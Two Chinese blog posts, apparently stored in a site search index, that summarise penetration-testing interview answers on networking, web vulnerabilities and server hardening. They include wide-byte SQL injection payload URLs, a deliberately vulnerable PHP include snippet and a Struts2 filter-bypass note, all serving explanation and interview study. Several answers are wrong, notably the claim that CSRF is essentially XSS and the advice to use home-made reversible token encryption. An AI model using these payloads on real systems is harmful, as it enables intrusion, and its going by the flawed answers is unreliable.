<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>渗透测试面试总结(五)</title>
    <url>/2019/12/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%BA%94)/</url>
    <content><![CDATA[<p>关于面试的一些总结。</p>
<a id="more"></a>

<p><strong>1.内网穿透?</strong> </p>
<p>即 NAT 穿透，采用端口映射，让外网的电脑找到处于内网的电脑，同时也可基于 HTTP/2 实现 web 内网穿透。</p>
<p><strong>2.虚拟专用网络?</strong></p>
<p>功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。</p>
<p>VPN 网关通过对数据包的加密和数据包目标地址的转换实现远程访问。例如某公司员工出差到外地，他想访问企业内网的服务器资源，这种访问就属于远程访问。</p>
<p>让外地员工访问到内网资源，利用 VPN 的解决方法就是在内网中架设一台 VPN服务器。外地员工在当地连上互联网后，通过互联网连接 VPN 服务器，然后通过 VPN 服务器进入企业内网。为了保证数据安全，VPN 服务器和客户机之间的通讯数据都进行了加密处理。有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，就如同专门架设了一个专用网络一样，但实际上 VPN使用的是互联网上的公用链路，因此 VPN 称为虚拟专用网络，其实质上就是利用加密技术在公网上封装出一个数据通讯隧道。有了 VPN 技术，用户无论是在外地出差还是在家中办公，只要能上互联网就能利用 VPN 访问内网资源，这就是 VPN 在企业中应用得如此广泛的原因。</p>
<p><strong>3.二层交换机?</strong></p>
<p>二层交换机工作于 OSI 模型的第 2 层（数据链路层），故而称为二层交换机。二层交换技术的发展已经比较成熟，二层交换机属数据链路层设备，可以识别数据包中的 MAC 地址信息，根据 MAC 地址进行转发，并将这些 MAC 地址与对应的端口记录在自己内部的一个地址表中。</p>
<p>过程</p>
<p>（1） 当交换机从某个端口收到一个数据包，它先读取包头中的源 MAC 地址，这样它就知道源 MAC 地址的机器是连在哪个端口上的；</p>
<p>（2） 再去读取包头中的目的 MAC 地址，并在地址表中查找应的端口；</p>
<p>（3）如表中有与这目的 MAC 地址对应的端口，把数据包直接复制到这端口上；</p>
<p>（4） 如表中找不到相应的端口则把数据包广播到所有端口上，当目的机器对源机器回应时，交换机又可以学习一目的 MAC 地址与哪个端口对应，在下次传送数据时就不再需要对所有端口进行广播了。不断的循环这个过程，对于全网的 MAC 地址信息都可以学习到，二层交换机就是这样建立和维护它自己的地址表。</p>
<p><strong>4.路由技术?</strong></p>
<p>路由器工作在 OSI 模型的第三层—网络层操作，其工作模式与二层交换相似，但路由器工作在第三层，这个区别决定了路由和交换在传递包时使用不同的控制信息，实现功能的方式就不同。工作原理是在路由器的内部也有一个表，这个表所标示的是如果要去某一个地方，下一步应该向哪里走，如果能从路由表中找到数据包下一步往哪里走，把链路层信息加上转发出去；如果不能知道下一步走向哪里，则将此包丢弃，然后返回一个信息交给源地址。路由技术实质上来说不过两种功能：决定最优路由和转发数据包。</p>
<p><strong>5.三层交换机?</strong></p>
<p>三层交换机就是具有部分路由器功能的交换机，三层交换机的最重要目的是加快大型局域网内部的数据交换，所具有的路由功能也是为这目的服务的，能够做到一次路由，多次转发。对于数据包转发等规律性的过程由硬件高速实现，而像路由信息更新、路由表维护、路由计算、路由确定等功能，由软件实现。三层交换技术就是二层交换技术+三层转发技术。传统交换技术是在 OSI 网络标准模型第二层——数据链路层进行操作的，而三层交换技术是在网络模型中的第三层实现了数据包的高速转发，既可实现网络路由功能，又可根据不同网络状况做到最优网络性能。</p>
<p><strong>6.IPv6 地址表示?</strong></p>
<p>IPv6 的 128 位地址通常写成 8 组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002 是一个合法的 IPv6 地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是 0，那么这些 0 就可以简单的以::来表示，上述地址就可写成 AD80::ABAA:0000:00C2:0002。同时前导的零可以省略，因此2001:0DB8:02de::0e13 等价于 2001:DB8:2de::e13。</p>
<p><strong>7.如果子域名和顶级域名不同源，在哪里可以设置叫他们同源?</strong> </p>
<p>在 IP 绑定域名的位置，将同一个主机 IP 指向解析子域名和顶级域名</p>
<p><strong>8.如何设置可以跨域请求数据？</strong></p>
<p>使用一个新的 Origin 请求头和一个新的 Access-Control-Allow-Origin 响应头扩展了 HTTP。允许服务端设置 Access-Control-Allow-Origin 头标识哪些站点可以请求文件，或者设置 Access-Control-Allow-Origin 头为”*”，允许任意站点访问文件。浏览器，例如 Firefox3.5，Safari4，IE10 使用这个头允许跨域 HTTP请求。</p>
<p><strong>9.jsonp 是做什么的？</strong></p>
<p>JOSNP 允许页面接受另一个域的 JSON 数据，通过在页面增加一个可以从其它域加载带有回调的 JSON 响应的<code>&lt;script&gt;</code> 标签。</p>
<p><strong>10.Ajax 是什么？</strong></p>
<p>AJAX = 异步 JavaScript 和 XML。AJAX 是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<p><strong>11.Ajax 是否遵循同源策略？</strong></p>
<p>是,同源策略的本质是一种约定，可以说 web 的行为就是构建在这种约定之上的。就好比我们人类的行为必须受到法律的约束一样。同源策略的目的就是限制不同源的 document 或者脚本之间的相互访问，以免造成干扰和混乱。ajax 太灵活了，各种请求说发就发，如果没有同源策略的限制，发到哪里都行，只要你构造好参数和请求路径，那人人都是黑客了，这样会导致各种敏感数据的泄露。</p>
<p><strong>12.宽字符注入的原理？如何利用宽字符注入漏洞，payload 如何构造？</strong></p>
<p>GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符（一字节）的现象。</p>
<p>MYSQL 的字符集转换过程</p>
<p>1.MySQL Server 收到请求时将请求数据从 character_set_client 转换为character_set_connection；</p>
<p>2.进行内部操作前将请求数据从 character_set_connection 转换为内部操作字符集，其确定方法如下：</p>
<p>3.使用每个数据字段的 CHARACTER SET 设定值；</p>
<p>4.若上述值不存在，则使用对应数据表的 DEFAULT CHARACTER SET 设定值(MySQL 扩展，非 SQL 标准)；</p>
<p>5.若上述值不存在，则使用对应数据库的 DEFAULT CHARACTER SET 设定值；</p>
<p>6.若上述值不存在，则使用 character_set_server 设定值。将操作结果从内部操作字符集转换为 character_set_results。宽字节注入发生的位置就是 PHP 发送请求到 MYSQL 时字符集使用character_set_client 设置值进行了一次编码。</p>
<p>注入点：<a href="http://x.x.x.x/index.php?id=1" target="_blank" rel="noopener">http://x.x.x.x/index.php?id=1</a> </p>
<p>提交 %bf’ 出现错误，由此可见存在宽字节注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://x.x.x.x/index.php?id=1%df&apos; order by 2%23</span><br><span class="line">http://x.x.x.x/index.php?id=-10%df&apos; union select 1,databases()%23</span><br></pre></td></tr></table></figure>

<p><strong>13.CRLF 注入的原理？</strong></p>
<p>HTTP 协议是依靠两个 CRLF，即\ r\n 来分割 HTTP 头部及响应体。基于这个认知，可以推出，HRS 问题是由于服务端程序没有过滤掉头部中的特殊字符<code>％0D  0A％</code>，直接输出到了返回的数据中，导致错误的解析。而在日常开发中，最常见的莫过于有以下的两种功能 URL 跳转和 Cookie 的设置中出现。一旦我们能够控制 http 头，通过注入一些 CRLF 这样就可以控制头和身体的分割线，这样我们就可以向身或是头中注入些东西了。所以 CRLF Injection 又叫 HTTP Response Splitting，简称 HRS</p>
<p><strong>14.如果给你一个 XSS 漏洞，你还需要哪些条件可以构造一个蠕虫？</strong></p>
<p>存储型的 xss，并且需要访问量大的页面或者关注按钮，如微博，论坛等</p>
<p><strong>15.在社交类的网站中，哪些地方可能会出现蠕虫？</strong></p>
<p>微博关注，社交报告调查，贴吧评论等</p>
<p><strong>16.如果叫你来防御蠕虫，你有哪些方法？</strong></p>
<p>对输入(和 URL 参数)进行过滤，对输出进行编码。</p>
<p><strong>17.如果给你一个 XSS 盲打漏洞，但是返回来的信息显示，他的后台是在内网，并且只能使用内网访问，那么你怎么利用这个 XSS？</strong></p>
<p>必须是 self xss + csrf +ssrf 到 getshell</p>
<p><strong>18.php 的 LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码。</strong></p>
<p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见包含函数有：include()、require()</p>
<p>区别：</p>
<p>include 是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行require 是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;f&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>19.CSRF 漏洞的本质是什么？</strong></p>
<p>本质就是 xss</p>
<p><strong>20.你都了解哪些 java 框架？</strong></p>
<p>spring 和 struts2 框架</p>
<p><strong>21.ibats 的参数化查询能不能有效的控制 sql 注入？有没有危险的方法可以造成 sql 注入？</strong></p>
<p>SQL 注入主要的是因为文本框的内容和 SQL 连接以后会改变 SQL 的语义，例如文本框包含单引号什么的参数化查询就可以将这些内容独立作为参数，本身的语句不会改变。</p>
<p><strong>22.ongl 在这个 payload 中起了什么作用？</strong></p>
<p>Ognl 表达式语言，Struts 标签默认支持的表达式语言，必须配置 Struts 标签用，不能离开 Struts 标签直接使用，就是说 Ognl 必须在 Struts 中使</p>
<p><strong>23.\u0023 是什么字符的 16 进制编码？为什么在 payload 中要用他？</strong></p>
<p># ，在 S2-005 中可通过\u0023 绕过过滤执行</p>
<p><strong>24.xss filter 在 java 程序的哪里设置？</strong></p>
<p>在 web.xml 里面配置</p>
<p><strong>25.说下 java 的类反射在安全上可能存在哪些问题？</strong></p>
<p>可能会导致 JAVA 反序化漏洞</p>
<p><strong>26.tomcat 要做哪些安全加固？</strong></p>
<p>升级到最新稳定版 从监听端口上加固 仅在本地监听</p>
<p>如果 Tomcat 不需要对外提供服务，则监听在本地回环，前面放 Nginx。如果需要对外提供访问，比如一个 Nginx 挂多个 Tomcat，那么在服务器上用iptables 只允许负载均衡器的 IP 来访问 关闭 8009 端口现在我们一般不用 Apache 通过 AJP 协议来调用 Tomcat 了，所以 AJP 端口可以关闭。</p>
<p>8005 端口查看端口占用情况自定义错误页面，隐藏 Tomcat 信息编辑 conf/web.xml，在标签上添加以下内容：禁用 Tomcat 管理页面删除 webapps 目录下 Tomcat 原有的所有内容删除 conf/Catalina/localhost/下的 host-manager.xml 和 manager.xml 这两个文件</p>
<p>用普通用户启动 Tomcat 禁止 Tomcat 列目录</p>
<p>如果 tomcat 重启的话，webapps 下，你删除的后台会不会又回来？你只是删除了后台，并没有删除 webaspps 下 war 包</p>
<p><strong>27.mysql 数据库默认有哪些库？说出库的名字？</strong></p>
<p>1.mysql 库，存储用户等信息 </p>
<p>2.information_schema，存储表、锁等性能信息</p>
<p>3.test，mysql 自建测试库</p>
<p>4.performance_schema，互斥锁等信息（5.6 之前需要手动开启，从 5.6 开始默认开启）</p>
<p><strong>28.mysql 的用户名密码是存放在那张表里面？mysql 密码采用哪种加密方式？</strong></p>
<p>mysql.user 表</p>
<p>MySQL 4.1 版本之前是 MySQL323 加密，MySQL 4.1 和之后的版本都是MySQLSHA1 加密MYSQL323 加密中生成的是 16 位字符串，而在 MySQLSHA1 中生存的是 41位字符串，其中<em>是不加入实际的密码运算中，通过观察在很多用户中都携带了”</em>“，在实际破解过程中去掉”*”，也就是说 MySQLSHA1 加密的密码的实际位数是 40 位。</p>
<p><strong>29.mysql 表权限里面，除了增删改查，文件读写，还有哪些权限？</strong></p>
<p>排序，查询，索引等</p>
<p><strong>30.mysql 安全要如何做？</strong></p>
<p>Mysql 账户权限安全</p>
<p>Mysql 数据的网络安全配置</p>
<p>密码策略安全</p>
<p>Mysql 日志</p>
<p>Mysql 数据库服务所在主机安全配置部署 SQL 注入检测、防御模块</p>
<p>mysqld 安全相关启动选项</p>
<p>mysql 备份策略</p>
<p><strong>31.简述 Linux 系统安全加固需要做哪些方面？</strong></p>
<p>1.密码安全策略</p>
<p>2.关闭不必要的端口和服务</p>
<p>3.文件权限的设置等</p>
<p><strong>32.你使用什么工具来判断系统是否存在后门？</strong></p>
<p>pchunter 攻击查看进程和服务</p>
<p><strong>33.Linux 的 Selinux 是什么？如何设置 Selinux？</strong></p>
<p>SELinux 是一种安全子系统，它能控制程序只能访问特定文件使用 setup 工具进入图形化关闭搜索或者修改/etc/sysconfig/selinux 文件SELINUX=disabled防火墙打开使用 service iptables start 或则/etc/init.d/iptables start</p>
<p><strong>34.iptables 工作在 TCP/IP 模型中的哪层？</strong></p>
<p>网络层</p>
<p><strong>35.syslog 里面都有哪些日志？安装软件的日志去哪找？</strong></p>
<p>如何查询 ssh 的登录日志？</p>
<p>cd /var/log </p>
<p>less secure </p>
<p><strong>36.syslog 可不可以使用 vi 等工具直接查看？是二进制文件吗？</strong></p>
<p>不能，只能使用 cat 之类的命令攻击查看，属于二进制文件</p>
<p><strong>37.DNS 在渗透中的作用？</strong></p>
<p>通过 DNS 可以查询对应的 IP 主机名，也可以查询出是否存在域传输漏洞</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试面试总结(四)</title>
    <url>/2019/12/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E5%9B%9B)/</url>
    <content><![CDATA[<p>关于面试的一些总结。</p>
<a id="more"></a>

<p><strong>1.添加时间戳防止重放攻击?</strong></p>
<p>如过客户端在向服务端接口进行请求,如果请求信息进行了加密处理，被第三方截取到请求包，虽然第三方无法解密获取其中的数据，但是可以使用该请求包进行重复的请求操作。如果服务端不进行防重放攻击，就会参数服务器压力增大，数据紊乱的后果。而使用添加时间戳的方式可以解决这一问题。。</p>
<p><strong>2.浅析 HTTPS 中间人攻击与证书校验？</strong></p>
<p>证书是 https 里非常重要的主体，可用来识别对方是否可信，以及用其公钥做密钥交换。可以看见证书里面包含证书的颁发者，证书的使用者，证书的公钥，颁发者的签名等信息。其中 Issuer Name 是签发此证书的 CA 名称,用来指定签发证书的 CA 的可识别的唯一名称(DN, Distinguished Name)，用于证书链的认证，这样通过各级实体证书的验证，逐渐上溯到链的终止点，即可信任的根 CA，如果到达终点在自己的信任列表内未发现可信任的 CA 则认为此证书不可信。https 握手过程的证书校验环节就是为了识别证书的有效性唯一性等等，所以严格意义上来说 https 下不存在中间人攻击，存在中间人攻击的前提条件是没有严格的对证书进行校验，或者人为的信任伪造证书，下面一起看下几种常见的https“中间人攻击”场景。</p>
<p>（1）证书未校验</p>
<p>由于客户端没有做任何的证书校验，所以此时随意一张证书都可以进行中间人攻击，可以使用 burp 里的这个模块进行中间人攻击。通过浏览器查看实际的 https 证书，是一个自签名的伪造证书。</p>
<p>（2）部分校验</p>
<p>做了部分校验，例如在证书校验过程中只做了证书域名是否匹配的校验，可以使用 burp 的如下模块生成任意域名的伪造证书进行中间人攻击。实际生成的证书效果，如果只做了域名、证书是否过期等校验可轻松进行中间人攻击(由于 chrome 是做了证书校验的所以会提示证书不可信任)。 </p>
<p>（3）证书链校验</p>
<p>如果客户端对证书链做了校验，那么攻击难度就会上升一个层次，此时需要人为的信任伪造的证书或者安装伪造的 CA 公钥证书从而间接信任伪造的证书，可以使用 burp 的如下模块进行中间人攻击。可以看见浏览器是会报警告的，因为 burp 的根证书 PortSwigger CA 并不在浏览器可信任列表内，所以由它作为根证书签发的证书都是不能通过浏览器的证书校验的，如果将 PortSwigger CA 导入系统设置为可信任证书，那么浏览器将不会有任何警告。</p>
<p>手机客户端 Https 数据包抓取</p>
<p>上述第一、二种情况不多加赘述，第三种情况就是我们经常使用的抓手机应用https 数据包的方法，即导入代理工具的公钥证书到手机里，再进行 https 数据包的抓取。导入手机的公钥证书在 android 平台上称之为受信任的凭据，可以看见是 Issuer 和 Subject 一样的自签名 CA 公钥证书，另外我们也可以通过证书类型就可以知道此为公钥证书，crt、der 格式的证书不支持存储私钥或证书路径(有兴趣的同学可查找证书相关信息)。导入 CA 公钥证书之后，参考上文的证书校验过程不难发现通过此方式能通过证书链校验，从而形成中间人攻击，客户端使用代理工具的公钥证书加密随机数，代理工具使用私钥解密并计算得到对称加密密钥，再对数据包进行解密即可抓取明文数据包。</p>
<p>（4）中间人攻击原理</p>
<p>一直在说中间人攻击，那么中间人攻击到底是怎么进行的呢，下面我们通过一个流行的 MITM 开源库 mitmproxy 来分析中间人攻击的原理。中间人攻击的关键在于 https 握手过程的 ClientKeyExchange，由于 pre key 交换的时候是使用服务器证书里的公钥进行加密，如果用的伪造证书的公钥，那么中间人就可以解开该密文得到 pre_master_secret 计算出用于对称加密算法的 master_key，从而获取到客户端发送的数据;然后中间人代理工具再使用其和服务端的master_key 加密传输给服务端;同样的服务器返回给客户端的数据也是经过中间人解密再加密，于是完整的 https 中间人攻击过程就形成了，一图胜千言，来吧。</p>
<p>（5）App 证书校验</p>
<p>通过上文第一和第二部分的说明，相信大家已经对 https 有个大概的了解了，那么问题来了，怎样才能防止这些“中间人攻击”呢?app 证书校验已经是一个老生常谈的问题了，但是市场上还是有很多的 app 未做好证书校验，有些只做了部分校验，例如检查证书域名是否匹配证书是否过期，更多数的是根本就不做校验，于是就造成了中间人攻击。做证书校验需要做完全，只做一部分都会导致中间人攻击，对于安全要求并不是特别高的 app 可使用如下校验方式：查看证书是否过期 服务器证书上的域名是否和服务器的实际域名相匹配，校验证书链。</p>
<p><strong>3.什么是 HttpOnly?</strong></p>
<p>如果您在 cookie 中设置了 HttpOnly 属性，那么通过 js 脚本将无法读取到cookie 信息，这样能有效的防止 XSS 攻击</p>
<p><strong>4.如何设计相对安全的 cookie 自动登录系统?</strong></p>
<p><a href="http://blog.sina.com.cn/s/blog_90cbd0ab0101ew0p.html这种技术其实就是基于" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_90cbd0ab0101ew0p.html这种技术其实就是基于</a> cookie 的自动登录，用户登录的时候会把需要验证的token 写到 cookie 里面，当用户 session 失效的时候，token 会通过 cookie 发送给服务器端，服务器端解析 token 判断是否已经登录；这里面的 token 如何设计是关键，到底存什么数据才能保证系统的安全性呢？有些新手可能会想，把用户 id 和 password 直接 md5 加密存到 cookie，这样做是最糟糕的设计，用户的敏感信息直接暴露出来，黑客可以伪造别人的 id 进行尝试性登录，可以想象黑客知道了 admin 账号的 id，试过几千几万次，密码和加密算法很可能破解出来。</p>
<p>token 要相对安全，不应该是简单的用户名和密码 md5 加密，用户密码其实完全可以不用存进去，分两步来做：</p>
<p>1) token 是一些信息的组合，用户 id+用户名+expires 过期时间+ip 地址+salt，具体加密算法最好自己写，不能使是常见的加密函数（md5）,当然这 个加密函数必须可逆，这个 token 我们同时要保存在用户表数据库里面,set cookie 的时候记得 http only；</p>
<p>2) 服务器端拿到 cookie 之后，进行逆解析，这个时候我们要验证如下信息：cookie 是否过期、ip 地址是否发生变化、用户 id 和用户名是否存在；用户存在之后，我们再拿这个 token 跟第一步存在数据库中的 token 进行比较，看是否相等，如果不等说明 token 已经过期，这样做可保证每次用户登录之 后 token值都不一样，之前用过的 token 都会失效；</p>
<p><strong>5.SSH 的定义？</strong></p>
<p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
<p><strong>6.服务器操作系统的安全防范？</strong></p>
<p>停止运行不需要的软件；（很可能成为外部攻击的入口）定期实施漏洞防范措施；（选定软件时确认软件的升级状况，确定打补丁方式，关注各种漏洞信息，确认漏洞后调查补丁状况以及防范对策，并制定对应计划）对不需要对外公开的端口或者服务加以访问限制；（通过端口扫描确认各端口服务状态）提高认证强度。</p>
<p><strong>7.日志文件查看？</strong></p>
<p>windows7 的日志信息文件存放在 C:windows-》System32-》winevt-》Logs文件夹下，对应的日志文件也有很多，并且文件格式都是 evtx 格式的文件，直接用 Eventvwr.msc 这个命令启用事件查看器来查看即可。或者点击开始然后单击控制面板进入 win7 控制面板，单击“系统和安全”选项。在右下方找到“查看事件日志”进入 windows 系统日志查看器。在日志查看器左侧可以选择查看不同类型日志，一般系统报错应该在“windows 日志/系统”中找相关信息。双击单条日志可以查看详细信息，而右侧栏可以对日志进行删除、复制等操作。</p>
<p><strong>8.localStorage 和 sessionStorage 区别？</strong></p>
<p><a href="http://www.cnblogs.com/tylerdonet/p/4833681.html" target="_blank" rel="noopener">http://www.cnblogs.com/tylerdonet/p/4833681.html</a></p>
<p><a href="http://www.2cto.com/article/201505/401601.html" target="_blank" rel="noopener">http://www.2cto.com/article/201505/401601.html</a></p>
<p>localStorage 和 sessionStorage 一样都是用来存储客户端临时信息的对象。他们均只能存储字符串类型的对象（虽然规范中可以存储其他原生类型的对象，但是目前为止没有浏览器对其进行实现）。localStorage 生命周期是永久，这意味着除非用户显示在浏览器提供的 UI 上清除 localStorage 信息，否则这些信息将永远存在。sessionStorage 生命周期为当前窗口或标签页，一旦窗口或标签页被永久关闭了，那么所有通过 sessionStorage 存储的数据也就被清空了。不同浏览器无法共享 localStorage 或 sessionStorage 中的信息。相同浏览器的不同页面间可以共享相同的 localStorage（页面属于相同域名和端口），但是不同页面或标签页间无法共享 sessionStorage 的信息。这里需要注意的是，页面及标 签页仅指顶级窗口，如果一个标签页包含多个 iframe 标签且他们属于同源页面，那么他们之间是可以共享 sessionStorage 的。</p>
<p><strong>9.简单的查找旁站？</strong></p>
<p>百度 域名查找 IP 打开可行的网页，在里面输入目标域名，搜索出服务器的 IP，然后百度 IP 反查域名 选择一个可行的网页打开，输入刚刚查询到的 IP，旁站就通通出来了。目标站没法子入侵不代表旁站也一样。</p>
<p><strong>10.什么是 WebShell?</strong></p>
<p>WebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的─种命令执行环境，也可以将其称做为─种网页后门。黑客在入侵了─个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 WEB 目录下正常的网页文件混在─起，然后就可以使用浏览器来访问这些 asp 或者 php 后门，得到─个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令等）。国内常用的 WebShell 有海阳 ASP 木马，Phpspy，c99shell 等。(静态网页：最常用的格式文件就是 html 格式文件，大部分网页的格式都是 html格式，html 格式又包含有.htm、dhtml.xhtml.shtm.shtml。这些都是指静态页面，里面不含有动态程序。动态网页页面级包括有 ASP（基于 JavaScript 或 VbScript 或 C#）、JSP、PHP、ASPX、jspx、cgi。这些里面是包含服务器端执行的代码，也就是服务器在将这些网页发给客户端之前，会先执行里面的动态程序语言，并把执行后生成的 html发送到客户端来的，所以我们在客户端看到的源代码也是 html 格式的（因为动态的代码直接在服务器上执行，而这些服务器代码是前台是不会显示出来。) </p>
<p><strong>11.什么是网络钓鱼？</strong></p>
<p>网络钓鱼是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件,意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、 ATM PIN 码或信用卡详细信息）的一种攻击方式。最典型的网络钓鱼攻击将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息，通常这个攻击过程不会让受害者警觉。它常常导引用户到 URL 与接口外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的 SSL 服务器认证，要侦测网站是否仿冒实际上仍很困难。网钓是一种利用社会工程技术来愚弄用户的实例。它凭恃的是现行网络安全技术的低亲和度。</p>
<p><strong>12.你获取网络安全知识途径有哪些？</strong></p>
<p>1.网站，看雪，安全焦点，国内的乌云，FreeBuf</p>
<p>2.视频学习：i 春秋，51cto，慕课网，实验楼，实验吧，网易云课堂，漏洞银行等等</p>
<p>3.微信公众号、知乎等，企业 src 等</p>
<p>4.书籍，《白帽子讲 web 安全》《Web 应用安全权威指南》等</p>
<p>5.然后就是请教大佬</p>
<p>6.还会打一些CTF 复现CVE等</p>
<p><strong>13.什么是 CC 攻击？</strong></p>
<p>这个也是知道一些，知道他是 DDos 的变种，正常请求伪造，服务器资源耗尽，最终还是看看百科答案吧：CC 攻击是 DDOS（分布式拒绝服务）的一种，相比其它的 DDOS 攻击 CC 似乎更有技术含量一些。这种攻击你见不到真实源 IP，见不到特别大的异常流量，但造成服务器无法进行正常连接。CC 攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。CC 主要是用来攻击页面的，每个人都有这样的体验：当一个网页访问的人数特别多的时候，打开网页就慢了，CC 就是模拟多个用户（多少线程就是多少用户）不停地进行访问那些需要大量数据操作（就是需要大量 CPU时间）的页面，造成服务器资源的浪费，CPU 长时间处于 100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。</p>
<p><strong>14.Web 服务器被入侵后，怎样进行排查？</strong></p>
<p>最简单就是 1.查看下 web 服务器日志，2.看看有没有异常端口开放，3.使用安全狗等服务器安全软件清扫。</p>
<p><strong>15.dll 文件是什么意思，有什么用？</strong></p>
<p>DLL（Dynamic Link Library）文件，即动态链接库，也有人称作应用程序拓展。Windows 应用程序中，实行了模块化设计，也就是说并不是每个应用程序都编写完所有的功能代码，而是在运行过程中调用相应功能的 DLL，不需运行的功能就不调用，所以大大加快了程序的加载速度和效率，其他应用程序也可以调用相关的 DLL，这样也有利于促进代码重用以及内存使用效率，减少了资源占用，而且程序更新时也只要更新相关的 DLL 就可以了。要注意的是，有些病毒也会伪装成 DLL 文件，并替换系统的 DLL 文件，需要我们防范。</p>
<p>（1）DLL 劫持原理</p>
<p>由于输入表中只包含 DLL 名而没有它的路径名，因此加载程序必须在磁盘上搜索 DLL 文件。首先会尝试从当前程序所在的目录加载 DLL，如果没找到，则在Windows 系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的 DLL，提供同样的输出表，每个输出函数转向真正的系统 DLL。程序调用系统 DLL 时会先调用当前目录下伪造的 DLL，完成相关功能后，再跳到系统 DLL 同名函数里执行。这个过程用个形象的词来描述就是系统 DLL 被劫持（hijack）了。伪造的 dll 制作好后，放到程序当前目录下，这样当原程序调用原函数时就调用了伪造的 dll 的同名函数，进入劫持 DLL 的代码，处理完毕后，再调用原 DLL此函数。</p>
<p>（2）如何防止 DLL 劫持DLL </p>
<p>劫持利用系统未知 DLL 的搜索路径方式，使得程序加载当前目录下的系统同名 DLL。所以可以告诉系统 DLL 的位置，改变加载系统 DLL 的顺序不是当前目录，而是直接到系统目录下查找。</p>
<p><strong>16.什么叫 0day 漏洞？</strong></p>
<p>是已经发现但是官方还没发布补丁的漏洞。信息安全意义上的 0Day 是指在安全补丁发布前而被了解和掌握的漏洞信息。</p>
<p><strong>17.Rootkit 是什么意思？</strong></p>
<p>Rootkit 是一种特殊类型的 malware（恶意软件）。Rootkit 之所以特殊是因为您不知道它们在做什么事情。Rootkit 基本上是无法检测到的，而且几乎不可能删除它们。虽然检测工具在不断增多，但是恶意软件的开发者也在不断寻找新的途径来掩盖他们的踪迹。Rootkit 的目的在于隐藏自己以及其他软件不被发现。它可以通过阻止用户识别和删除攻击者的软件来达到这个目的。Rootkit 几乎可以隐藏任何软件，包括文件服务器、键盘记录器、Botnet 和 Remailer。许多 Rootkit 甚至可以隐藏大型的文件集合并允许攻击者在您的计算机上保存许多文件，而您无法看到这些文件。</p>
<p>Rootkit 本身不会像病毒或蠕虫那样影响计算机的运行。攻击者可以找出目标系统上的现有漏洞。漏洞可能包括：开放的网络端口、未打补丁的系统或者具有脆弱的管理员密码的系统。在获得存在漏洞的系统的访问权限之后，攻击者便可手动安装一个 Rootkit。这种类型的偷偷摸摸的攻击通常不会触发自动执行的网络安全控制功能，例如入侵检测系统。找出 Rootkit 十分困难。有一些软件包可以检测 Rootkit。这些软件包可划分</p>
<p>为以下两类：基于签名的检查程序和基于行为的检查程序。基于签名（特征码）的检查程序，例如大多数病毒扫描程序，会检查二进制文件是否为已知的Rootkit。基于行为的检查程序试图通过查找一些代表 Rootkit 主要行为的隐藏元素来找出 Rootkit。一个流行的基于行为的 Rootkit 检查程序是 Rootkit </p>
<p>Revealer.在发现系统中存在 Rootkit 之后，能够采取的补救措施也较为有限。由于Rootkit 可以将自身隐藏起来，所以您可能无法知道它们已经在系统中存在了多长的时间。而且您也不知道 Rootkit 已经对哪些信息造成了损害。对于找出的Rootkit，最好的应对方法便是擦除并重新安装系统。虽然这种手段很严厉，但是这是得到证明的唯一可以彻底删除 Rootkit 的方法。防止 Rootkit 进入您的系统是能够使用的最佳办法。为了实现这个目的，可以使用与防范所有攻击计算机的恶意软件一样的深入防卫策略。深度防卫的要素包括：病毒扫描程序、定期更新软件、在主机和网络上安装防火墙，以及强密码策略</p>
<p><strong>18.蜜罐是什么？</strong></p>
<p>蜜罐好比是情报收集系统。蜜罐好像是故意让人攻击的目标，引诱黑客前来攻击。所以攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络。</p>
<p><strong>19.DDOS 的定义？</strong></p>
